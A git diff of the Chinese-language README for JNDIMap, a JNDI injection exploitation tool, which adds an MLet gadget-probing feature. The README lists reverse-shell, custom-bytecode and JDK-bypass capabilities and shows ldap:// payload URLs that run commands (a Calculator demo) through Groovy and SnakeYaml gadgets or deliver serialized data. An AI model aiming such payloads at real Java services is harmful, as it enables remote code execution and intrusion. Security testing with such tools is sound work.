@@ -1,6 +1,6 @@
 # JNDIMap
 
-JNDI 注入利用工具
+JNDIMap 是一个 JNDI 注入利用工具
 
 目前支持以下功能
 
@@ -9,6 +9,7 @@ JNDI 注入利用工具
 - 原生反弹 Shell
 - 加载自定义 Class 字节码
 - Tomcat/Groovy/SnakeYaml 绕过高版本 JDK
+- MLet 探测可用 Gadget
 - LDAP 反序列化
 
 ## Usage
@@ -42,6 +43,10 @@ ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator
 # SnakeYaml Bypass
 ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator
 ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator
+
+# MLet 探测可用 Gadget
+# 如果 com.example.TestClass 这个类存在, 则 HTTP 服务器会接收到一个 /com/example/TestClass_exists.class 请求
+ldap://127.0.0.1:1389/MLet/com.example.TestClass
 
 # 自定义数据 反序列化
 ldap://127.0.0.1:1389/Deserialize/<base64-serialize-data>
